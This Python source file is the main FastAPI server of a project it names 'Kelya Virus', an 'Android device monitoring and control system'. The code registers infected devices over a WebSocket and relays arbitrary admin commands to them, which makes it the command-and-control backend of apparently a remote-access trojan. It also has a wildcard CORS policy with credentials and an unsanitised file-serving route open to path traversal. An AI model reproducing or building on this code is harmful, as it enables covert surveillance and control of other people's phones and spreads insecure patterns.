"""Main FastAPI application"""
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from pathlib import Path

from backend.config import SERVER_HOST, SERVER_PORT, DEBUG
from backend.auth.router import router as auth_router, decode_access_token
from backend.devices.router import router as devices_router
from backend.websocket.handler import ws_manager
from backend.models import DeviceInfo

# Create FastAPI app
app = FastAPI(
    title="Kelya Virus",
    description="Android device monitoring and control system",
    version="1.0.0"
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(auth_router)
app.include_router(devices_router)


@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "name": "Kelya Virus",
        "version": "1.0.0",
        "status": "running"
    }


@app.get("/api/stats")
async def get_stats():
    """Get system statistics"""
    devices = ws_manager.get_active_devices()
    return {
        "total_devices": len(devices),
        "online_devices": len([d for d in devices.values()]),
        "admin_connections": len(ws_manager.admin_connections)
    }


@app.websocket("/ws/device")
async def websocket_device(websocket: WebSocket):
    """WebSocket endpoint for devices"""
    device_id = None
    
    try:
        await websocket.accept()
        
        # Wait for registration message
        data = await websocket.receive_text()
        message = json.loads(data)
        
        if message.get("type") != "register":
            await websocket.close(code=1008, reason="Registration required")
            return
        
        # Create device info
        device_info = DeviceInfo(**message.get("device_info", {}))
        device_id = device_info.id
        
        # Connect device
        conn = await ws_manager.connect_device(device_info, websocket)
        
        # Handle messages
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            await ws_manager.handle_device_message(device_id, message)
            
    except WebSocketDisconnect:
        if device_id:
            await ws_manager.disconnect_device(device_id)
    except Exception as e:
        print(f"WebSocket device error: {e}")
        if device_id:
            await ws_manager.disconnect_device(device_id)


@app.websocket("/ws/admin")
async def websocket_admin(
    websocket: WebSocket,
    token: str = Query(...)
):
    """WebSocket endpoint for admins"""
    # Verify token
    payload = decode_access_token(token)
    if not payload:
        await websocket.close(code=1008, reason="Invalid token")
        return
    
    try:
        await ws_manager.connect_admin(websocket)
        
        # Handle messages
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Handle admin commands
            if message.get("type") == "command":
                device_id = message.get("device_id")
                command = message.get("command")
                command_data = message.get("data", {})
                
                from backend.models import DeviceCommand
                await ws_manager.send_command(
                    device_id,
                    DeviceCommand(command=command, data=command_data)
                )
    
    except WebSocketDisconnect:
        await ws_manager.disconnect_admin(websocket)
    except Exception as e:
        print(f"WebSocket admin error: {e}")
        await ws_manager.disconnect_admin(websocket)


# Serve React frontend (if available)
frontend_path = Path(__file__).parent.parent / "frontend" / "build"
static_path = frontend_path / "static"

if frontend_path.exists() and (frontend_path / "index.html").exists():
    # Mount static files only if the directory exists
    if static_path.exists():
        app.mount("/static", StaticFiles(directory=static_path), name="static")
    
    @app.get("/{full_path:path}")
    async def serve_frontend(full_path: str):
        """Serve React app for all other routes"""
        file_path = frontend_path / full_path
        if file_path.is_file():
            return FileResponse(file_path)
        return FileResponse(frontend_path / "index.html")


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "backend.main:app",
        host=SERVER_HOST,
        port=SERVER_PORT,
        reload=DEBUG
    )

